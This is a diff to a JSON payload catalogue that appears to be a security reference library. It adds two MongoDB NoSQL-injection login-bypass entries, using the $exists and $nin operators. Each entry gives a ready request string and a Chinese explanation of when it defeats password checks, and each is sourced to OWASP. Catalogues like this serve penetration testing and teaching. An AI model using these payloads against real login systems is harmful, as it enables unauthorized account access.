@@ -27,6 +27,28 @@
       "source": "OWASP NoSQL Injection"
     },
     {
+      "id": "nosql-mongo-exists",
+      "title": "$exists 字段存在绕过",
+      "category": "MongoDB 认证绕过",
+      "code": "username=admin&password[$exists]=true",
+      "desc": "只要求 password 字段存在，不校验其具体值，适用于后端把参数对象直接拼进查询条件的情况。",
+      "tags": ["nosql", "mongodb", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP NoSQL Injection"
+    },
+    {
+      "id": "nosql-mongo-nin",
+      "title": "$nin 排除匹配",
+      "category": "MongoDB 认证绕过",
+      "code": "username=admin&password[$nin][]=wrong",
+      "desc": "口令只要不等于给定值即匹配，用于绕过只校验口令正确性的逻辑；$nin 后接数组，与 $ne 适用场景不同。",
+      "tags": ["nosql", "mongodb", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP NoSQL Injection"
+    },
+    {
       "id": "nosql-mongo-regex",
       "title": "$regex 盲匹配",
       "category": "MongoDB 认证绕过",
